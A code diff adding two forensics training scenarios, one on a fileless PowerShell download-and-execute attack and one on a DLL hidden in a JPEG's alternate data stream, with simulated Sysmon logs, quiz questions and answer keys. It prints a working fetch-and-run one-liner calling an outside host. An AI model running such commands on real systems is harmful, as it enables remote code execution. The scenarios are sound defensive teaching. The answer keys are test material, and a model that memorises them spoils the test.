@@ -551,4 +551,396 @@ Triage what it proves.
       },
     ],
   },
+
+  // ─── 4. Memory-only / fileless payload ──────────────────────
+  {
+    slug: "anti-forensics-memory-only-payload-001",
+    title: "Fileless: PowerShell IEX with No File on Disk",
+    summary:
+      "Sysmon captured a PowerShell process pulling a script over HTTPS and piping it to Invoke-Expression. There's no file on disk to hash. Read what the events do and don't support.",
+    skillAreas: ["anti_forensics", "windows_artifacts", "malware_analysis", "inference_discipline"],
+    difficulty: 4,
+    estimatedMinutes: 15,
+    tags: ["anti_forensics", "fileless", "powershell", "windows_artifacts"],
+    lane: "anti_forensics",
+    module: "Memory-only payloads",
+    sequence: 4,
+    brief: `
+# Brief
+
+A common modern attacker pattern: avoid writing the payload to
+disk at all. The implant lives only in process memory; the script
+that pulls it down is one PowerShell pipeline; nothing exists on
+disk for a static AV scanner to fingerprint.
+
+The canonical one-liner:
+
+\`\`\`
+powershell.exe -nop -w hidden -ep bypass -c
+"IEX (New-Object Net.WebClient).DownloadString('https://...')"
+\`\`\`
+
+\`Invoke-Expression\` (\`IEX\`) takes the downloaded string and
+executes it as PowerShell code inside the running process. No
+file write, no Prefetch entry for a downloaded binary, no
+imphash. The artifacts that DO exist are:
+
+- The \`powershell.exe\` ProcessCreate event (Sysmon Event 1)
+- The outbound HTTPS connect (Sysmon Event 3)
+- The PowerShell ScriptBlock log (Event 4104) if PowerShell
+  script-block logging is enabled
+
+Read the events and decide what they support.
+`.trim(),
+    artifacts: [
+      {
+        ordinal: 1,
+        displayName: "sysmon-event-1.txt",
+        kind: "text",
+        mimeType: "text/plain; charset=utf-8",
+        bytes: utf8(
+          [
+            "Sysmon Event ID 1 — ProcessCreate",
+            "Channel: Microsoft-Windows-Sysmon/Operational",
+            "Source machine: WS-DEV-12",
+            "",
+            "Time            2025-01-08 13:22:47 UTC",
+            "ProcessId       6604",
+            "Image           C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+            "Signed          true (Microsoft Windows)",
+            "CommandLine     powershell.exe -nop -w hidden -ep bypass -c",
+            "                \"IEX (New-Object Net.WebClient).DownloadString('https://cdn.code-paste.net/raw/eafb2c')\"",
+            "User            CORP\\j.azevedo",
+            "ParentImage     C:\\Windows\\System32\\cmd.exe",
+            "ParentCommandLine    cmd.exe /c \"%TEMP%\\stage.bat\"",
+            "Hashes          MD5=...  SHA256=fed6... (matches signed Windows PowerShell)",
+            "",
+          ].join("\n"),
+        ),
+      },
+      {
+        ordinal: 2,
+        displayName: "sysmon-event-3.txt",
+        kind: "text",
+        mimeType: "text/plain; charset=utf-8",
+        bytes: utf8(
+          [
+            "Sysmon Event ID 3 — NetworkConnect",
+            "Channel: Microsoft-Windows-Sysmon/Operational",
+            "Source machine: WS-DEV-12",
+            "",
+            "Time            2025-01-08 13:22:48 UTC",
+            "ProcessId       6604",
+            "Image           C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+            "User            CORP\\j.azevedo",
+            "Protocol        tcp",
+            "DestinationIp   198.51.100.140",
+            "DestinationHostname  cdn.code-paste.net",
+            "DestinationPort 443",
+            "Initiated       true",
+            "",
+          ].join("\n"),
+        ),
+      },
+      {
+        ordinal: 3,
+        displayName: "scriptblock-status.txt",
+        kind: "text",
+        mimeType: "text/plain; charset=utf-8",
+        bytes: utf8(
+          [
+            "PowerShell logging configuration (pulled from the host's GPO)",
+            "",
+            "Microsoft-Windows-PowerShell/Operational:",
+            "    Module logging                       NOT ENABLED",
+            "    Script-block logging (Event 4104)    NOT ENABLED",
+            "    Transcription                        NOT ENABLED",
+            "",
+            "(no PowerShell 4104 events available for this run)",
+            "",
+          ].join("\n"),
+        ),
+      },
+    ],
+    questions: [
+      {
+        ordinal: 1,
+        type: "multi_choice",
+        weight: 2,
+        promptMd:
+          "Which statements are **directly supported** by these artifacts? Select all that apply.",
+        options: [
+          {
+            id: "powershell-ran",
+            label:
+              "A signed `powershell.exe` ran under `j.azevedo`'s account at 2025-01-08 13:22:47 UTC and connected outbound to `cdn.code-paste.net:443` one second later.",
+          },
+          {
+            id: "iex-downloaded",
+            label:
+              "The PowerShell command line shows `IEX (New-Object Net.WebClient).DownloadString(...)` — the script downloaded a payload string and piped it directly to `Invoke-Expression`, which executes it as PowerShell code in the running process.",
+          },
+          {
+            id: "we-have-the-payload",
+            label:
+              "The downloaded script itself is recoverable from the Sysmon events — Event 3 captures the response body for any flow it logs.",
+          },
+          {
+            id: "no-file-written",
+            label:
+              "No payload file was written to disk by this PowerShell invocation, so static-disk AV scanners won't have anything to fingerprint for this campaign.",
+          },
+          {
+            id: "j-azevedo-attacker",
+            label:
+              "`j.azevedo` is the attacker — the events show the activity under their account.",
+          },
+        ],
+        allowMultiple: true,
+        expected: {
+          type: "multi_choice",
+          correctIds: ["powershell-ran", "iex-downloaded", "no-file-written"],
+          allowMultiple: true,
+        },
+        debriefMd: [
+          "**Proven:**",
+          "",
+          "- *PowerShell ran + outbound connect.* The Sysmon events are unambiguous on the process + network side.",
+          "- *IEX downloaded + piped to invoke.* The command line itself documents the technique. The string after `-c` is what PowerShell will execute, and `IEX (DownloadString(...))` is the canonical fileless-payload pattern.",
+          "- *No file written by this process.* The pipeline keeps the downloaded string in memory — there's no Event 11 (FileCreate) corresponding to this PID, and the pattern by design avoids touching disk.",
+          "",
+          "**Not proven:**",
+          "",
+          "- *Payload is recoverable from Sysmon Event 3.* Event 3 captures the **connection metadata** (5-tuple, timing), not the response body. Recovery needs a full PCAP from the window or an SSL-intercepting proxy.",
+          "- *j.azevedo is the attacker.* The events show the user **context** the process ran as. That's not the same as the user typing it. The parent `cmd.exe /c \"%TEMP%\\stage.bat\"` suggests an upstream batch file was triggered — anything from a malicious shortcut to a scheduled task could have launched it under j.azevedo's session.",
+        ].join("\n"),
+      },
+      {
+        ordinal: 2,
+        type: "multi_choice",
+        weight: 1,
+        promptMd:
+          "Which corroborating sources would best **recover the downloaded payload**?",
+        options: [
+          { id: "pcap", label: "Full PCAP from the host's egress for 13:22:47–13:23:00 UTC, decrypted with the SSL-intercepting proxy's key material if the org runs one." },
+          { id: "proxy-cache", label: "Proxy / SWG logs from the org's web gateway — most TLS-aware proxies cache the response body for content inspection." },
+          { id: "memory-image", label: "Live memory image of WS-DEV-12 (or a triage memory acquisition), then Volatility `windows.cmdline` + `malfind` against PID 6604 to recover the executed script from memory." },
+          { id: "scriptblock-historical", label: "Retroactively enable PowerShell script-block logging on WS-DEV-12 — that will surface the executed code for this run." },
+          { id: "fetch-url", label: "Re-fetch `https://cdn.code-paste.net/raw/eafb2c` from the analyst workstation. The URL is in the command line, so the payload is one curl away." },
+        ],
+        allowMultiple: true,
+        expected: {
+          type: "multi_choice",
+          correctIds: ["pcap", "proxy-cache", "memory-image"],
+          allowMultiple: true,
+        },
+        debriefMd: [
+          "PCAP + proxy + memory triage are the three real recovery surfaces.",
+          "",
+          "**Why the others are wrong:**",
+          "",
+          "- *Retroactively enable script-block logging.* PowerShell logging settings apply going forward; they don't reconstruct historical sessions.",
+          "- *Re-fetch the URL.* Tempting but operationally hostile. The URL may serve different content depending on User-Agent / IP / time-of-day (common in staged C2). Re-fetching also signals to the attacker that someone's looking. Use the **stored** version from PCAP / proxy / memory; treat the live URL as out-of-scope for triage.",
+        ].join("\n"),
+      },
+      {
+        ordinal: 3,
+        type: "confidence",
+        weight: 1,
+        promptMd:
+          "Confidence (1–5) that the host is compromised, given only these three artifacts.",
+        expected: { type: "confidence", expectedRange: [3, 4] },
+        debriefMd:
+          "**3 or 4.** A signed Windows binary calling `IEX` on a downloaded string from a Pastebin-style URL is the textbook signature of a fileless-payload stage. The pattern is suspicious enough to drive containment immediately. But it's not yet a verdict — until you recover what was actually executed (pcap, proxy, memory) you can't classify the campaign or confirm it wasn't a legitimate dev-ops one-liner gone awry. Reserve 5 for after you've read the payload.",
+      },
+    ],
+  },
+
+  // ─── 5. Steganography / ADS hiding ──────────────────────────
+  {
+    slug: "anti-forensics-ads-hidden-payload-001",
+    title: "Alternate Data Streams: \"It's Just a JPEG\"",
+    summary:
+      "An image file in a user's Downloads folder is bigger than the picture data. Read the streams output and decide what's actually on the file.",
+    skillAreas: ["anti_forensics", "windows_artifacts", "df_artifacts", "inference_discipline"],
+    difficulty: 3,
+    estimatedMinutes: 12,
+    tags: ["anti_forensics", "ads", "steganography", "windows_artifacts"],
+    lane: "anti_forensics",
+    module: "Hiding in plain sight",
+    sequence: 5,
+    brief: `
+# Brief
+
+NTFS lets a single file carry multiple named **streams** of
+content. The unnamed stream is what Explorer shows; named streams
+are invisible to standard tools but available to any process that
+knows the stream syntax (\`file.txt:hidden.exe\`).
+
+Most uses are benign — \`Zone.Identifier\` is the Mark-of-the-Web
+ADS that browsers and mail clients write to flag downloaded files
+as Internet-zone. Steganographic abuse hides executable payloads
+or staged data inside ADSes on files whose primary stream looks
+ordinary.
+
+The streams view comes from \`dir /R\`, PowerShell \`Get-Item
+-Stream *\`, or Sysinternals \`streams.exe\`. The Sysmon Event 15
+(FileCreateStreamHash) records named-stream creates with hashes.
+
+Read the artifacts. Decide what \`vacation.jpg\` actually is.
+`.trim(),
+    artifacts: [
+      {
+        ordinal: 1,
+        displayName: "streams-output.txt",
+        kind: "text",
+        mimeType: "text/plain; charset=utf-8",
+        bytes: utf8(
+          [
+            "PowerShell: Get-Item -Stream * 'C:\\Users\\m.cho\\Downloads\\vacation.jpg'",
+            "",
+            "Filename : vacation.jpg",
+            "Stream   : :$DATA",
+            "Length   : 2,418,704      (the JPEG itself — opens normally in Photos)",
+            "",
+            "Filename : vacation.jpg",
+            "Stream   : Zone.Identifier",
+            "Length   : 124            (Mark-of-the-Web; download URL recorded)",
+            "",
+            "Filename : vacation.jpg",
+            "Stream   : config.bin",
+            "Length   : 198,432        (unknown -- 194 KB binary, no obvious header)",
+            "",
+            "Filename : vacation.jpg",
+            "Stream   : stage2.dll",
+            "Length   : 716,288        (700 KB binary; starts \\x4D\\x5A == MZ header)",
+            "",
+            "",
+            "(`dir /R` from cmd.exe shows the same four streams; the",
+            "Explorer \"Properties\" view shows only the JPEG -- streams",
+            "Zone.Identifier, config.bin, and stage2.dll are invisible there.)",
+            "",
+          ].join("\n"),
+        ),
+      },
+      {
+        ordinal: 2,
+        displayName: "sysmon-event-15.txt",
+        kind: "text",
+        mimeType: "text/plain; charset=utf-8",
+        bytes: utf8(
+          [
+            "Sysmon Event ID 15 — FileCreateStreamHash",
+            "Channel: Microsoft-Windows-Sysmon/Operational",
+            "Source machine: WS-HRD-04",
+            "",
+            "Time            2024-12-30 18:09:12 UTC",
+            "Image           C:\\Users\\m.cho\\AppData\\Roaming\\driveupdater.exe",
+            "TargetFilename  C:\\Users\\m.cho\\Downloads\\vacation.jpg:stage2.dll",
+            "Hash            SHA256=9c2f...",
+            "",
+            "Time            2024-12-30 18:09:14 UTC",
+            "Image           C:\\Users\\m.cho\\AppData\\Roaming\\driveupdater.exe",
+            "TargetFilename  C:\\Users\\m.cho\\Downloads\\vacation.jpg:config.bin",
+            "Hash            SHA256=04f5...",
+            "",
+            "Time            2024-12-30 18:08:51 UTC",
+            "Image           C:\\Windows\\Explorer.exe",
+            "TargetFilename  C:\\Users\\m.cho\\Downloads\\vacation.jpg:Zone.Identifier",
+            "Hash            SHA256=7711...",
+            "",
+          ].join("\n"),
+        ),
+      },
+    ],
+    questions: [
+      {
+        ordinal: 1,
+        type: "multi_choice",
+        weight: 2,
+        promptMd:
+          "Which statements are **directly supported** by the artifacts?",
+        options: [
+          {
+            id: "jpeg-plus-ads",
+            label:
+              "`vacation.jpg` carries the JPEG image data plus three named alternate data streams; two of them (`config.bin`, `stage2.dll`) were written by `driveupdater.exe` on 2024-12-30, and the third (`Zone.Identifier`) is the Mark-of-the-Web written by Explorer when the file was downloaded.",
+          },
+          {
+            id: "stage2-is-pe",
+            label:
+              "The `stage2.dll` stream begins with the `MZ` magic bytes — it's a Windows PE binary, not random data — hidden inside what looks like an ordinary image file.",
+          },
+          {
+            id: "driveupdater-malware",
+            label:
+              "`driveupdater.exe` is malware: it's writing hidden payloads to an image file, which is by definition malicious behaviour.",
+          },
+          {
+            id: "all-jpegs-ads",
+            label:
+              "All JPEG files on NTFS have these alternate streams as standard metadata. The streams view here is showing normal Windows behaviour, not a steganographic hide.",
+          },
+        ],
+        allowMultiple: true,
+        expected: {
+          type: "multi_choice",
+          correctIds: ["jpeg-plus-ads", "stage2-is-pe"],
+          allowMultiple: true,
+        },
+        debriefMd: [
+          "**Proven:**",
+          "",
+          "- *JPEG + three ADS, with the writers identified.* The streams output names them, the Sysmon Event 15 captures the writer image for each.",
+          "- *stage2.dll is a PE binary.* The `MZ` magic bytes are the canonical Windows executable signature. Hiding a PE inside the ADS of a JPEG is a textbook steganographic pattern.",
+          "",
+          "**Not proven (over-claims):**",
+          "",
+          "- *driveupdater.exe is malware by definition.* Writing to ADSes isn't itself proof of malice — the OS uses ADSes for benign things (Zone.Identifier, Spotlight metadata). The pattern here is suspicious because the streams contain unknown binaries on a file the user thinks is an image, but the writeup needs to triage `driveupdater.exe` separately to render a verdict on the writer.",
+          "- *All JPEGs have these streams.* The only standard ADS on a downloaded JPEG is `Zone.Identifier`. `config.bin` and `stage2.dll` are not standard.",
+        ].join("\n"),
+      },
+      {
+        ordinal: 2,
+        type: "text_match",
+        weight: 1,
+        promptMd:
+          "What command would extract `stage2.dll` from `vacation.jpg` to a standalone file on disk for offline analysis? (Either PowerShell or cmd is fine.)",
+        textMatch: {
+          acceptableAnswers: [
+            "get-content -path vacation.jpg -stream stage2.dll -raw | set-content -path stage2.dll -encoding byte",
+            "get-content vacation.jpg -stream stage2.dll -encoding byte | set-content stage2.dll -encoding byte",
+            "more < vacation.jpg:stage2.dll > stage2.dll",
+            "type vacation.jpg:stage2.dll > stage2.dll",
+            "powershell get-content -path vacation.jpg -stream stage2.dll",
+          ],
+          hint: "PowerShell `Get-Item` reads metadata; `Get-Content -Stream` reads the bytes. cmd has `more <` as the workhorse for the same trick.",
+          hintAfterTries: 2,
+        },
+        expected: {
+          type: "text_match",
+          acceptableAnswers: [
+            "get-content -path vacation.jpg -stream stage2.dll -raw | set-content -path stage2.dll -encoding byte",
+            "get-content vacation.jpg -stream stage2.dll -encoding byte | set-content stage2.dll -encoding byte",
+            "more < vacation.jpg:stage2.dll > stage2.dll",
+            "type vacation.jpg:stage2.dll > stage2.dll",
+            "powershell get-content -path vacation.jpg -stream stage2.dll",
+          ],
+          regex: false,
+        },
+        debriefMd:
+          "Either `Get-Content -Path vacation.jpg -Stream stage2.dll` (PowerShell) or `more < vacation.jpg:stage2.dll > stage2.dll` (cmd) reads the named stream's bytes. Save them to a fresh file and hash + sandbox + static-triage like any other suspect DLL.",
+      },
+      {
+        ordinal: 3,
+        type: "confidence",
+        weight: 1,
+        promptMd:
+          "Confidence (1–5) that `vacation.jpg` should be treated as compromised, based on these artifacts alone.",
+        expected: { type: "confidence", expectedRange: [4, 5] },
+        debriefMd:
+          "**4 or 5.** An unknown PE binary in an ADS on a user-downloaded JPEG, written by an unfamiliar `driveupdater.exe` from `AppData\\Roaming`, is a strong enough pattern to trigger containment. The remaining question is what the binary IS (sandbox + static triage), not whether to act — that part the artifacts already settle.",
+      },
+    ],
+  },
 ];
